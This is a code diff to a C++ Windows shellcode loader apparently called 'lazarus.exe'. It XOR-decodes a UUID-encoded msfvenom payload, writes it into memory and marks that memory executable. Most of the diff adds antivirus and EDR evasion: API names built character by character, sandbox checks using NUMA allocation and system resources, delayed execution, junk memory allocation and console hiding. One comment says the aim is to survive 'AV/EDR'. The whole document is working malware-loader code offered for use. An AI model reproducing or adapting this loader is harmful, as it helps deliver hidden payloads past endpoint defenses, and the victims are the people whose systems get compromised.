@@ -1,4 +1,6 @@
 #include <windows.h>
+
+// ------------------
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
@@ -9,6 +11,11 @@
 #define XOR_KEY "<YOUR_XOR_KEY>"
 
 #define EXE_NAME "lazarus.exe"
+
+#define LOTS_OF_MEM 250'000'000
+
+// the MAGICAL( but random ) byte
+#define MAGIC_BYTE 0xf1
 
 // Uncomment the line below if you're using Visual Studio for compiling.
 // #pragma comment(lib, "Rpcrt4.lib")
@@ -22,8 +29,9 @@ typedef LPVOID(WINAPI *pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, S
 bool checkNUMA()
 {
         LPVOID mem{NULL};
-        const char k32DllName[13]{ 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
-        const char vAllocExNuma[19]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', 0x0 };
+        const char k32DllName[13]{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0};
+        const char vAllocExNuma[19]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l',
+                                    'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', 0x0};
         pVirtualAllocExNuma myVirtualAllocExNuma =
             (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle(k32DllName), vAllocExNuma);
         mem =
@@ -59,28 +67,15 @@ bool checkResources()
         return true;
 }
 
-void XOR(char *data, unsigned long data_len, char *key, unsigned long key_len)
+void XOR(BYTE *data, unsigned long data_len, char *key, unsigned long key_len)
 {
-        for (int i{0}; i < data_len; ++i)
-        {
+        for (unsigned long i{0x0}; i < data_len; ++i)
                 data[i] ^= key[i % key_len];
-        }
-}
-
-int getposition(unsigned char array[], size_t size)
-{
-        for (int i{0}; i < size; i++)
-        {
-                if (array[i] == ',')
-                {
-                        return i;
-                }
-        }
-        return 0;
 }
 
 int main(int argc, char *argv[])
 {
+        FreeConsole();
 
         // payload generation:
         // 1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
@@ -149,11 +144,19 @@ int main(int argc, char *argv[])
                 return -2;
         }
 
+        const char virtProt[15] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0};
+
         Sleep(7500); // you could use "ekko" by crack5pider for this, i'm still lazy for this
 
-        char *mem{(char *)malloc(100000000)};
-        if (mem != NULL)
+        const char k32DllName[13]{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0};
+        const char vAlloc[13]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0};
+
+        BYTE *junk_mem{(BYTE *)malloc(LOTS_OF_MEM)};
+        if (junk_mem)
         {
+                memset(junk_mem, MAGIC_BYTE, LOTS_OF_MEM);
+                free(junk_mem);
+
 #if DEBUG
                 printf("Before xor: %s\n\n", payload);
 #endif
@@ -186,21 +189,16 @@ int main(int argc, char *argv[])
                         RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID *)hptr);
                         if (status != RPC_S_OK)
                         {
-                                printf("[-] UUID convert error\n");
+                                fprintf(stderr, "[-] UUID conversion error: try to make sure your XOR keys match or "
+                                                "correct the way you set up the payload.\n");
                                 CloseHandle(mem);
-                                return -1;
+                                return EXIT_FAILURE;
                         }
-                        int pos{getposition(payload, sizeof(payload))};
-                        if (pos > 0)
-                        {
-                                pos += 2;
-                                int gap{sizeof(payload) - pos};
-                                memcpy(payload, &payload[pos], gap);
-                        }
+
                         hptr += 16;
+                        temp = strtok(NULL, "\n");
                 }
 
-                const char virtProt[15] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
                 pMVP = GetProcAddress(k32_handle, virtProt);
                 rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect);
                 if (!rv)
@@ -221,6 +219,6 @@ int main(int argc, char *argv[])
         }
         else
         {
-                return EXIT_FAILURE;
+                return EXIT_FAILURE; // survived that AV/EDR. Phew!!
         }
 }
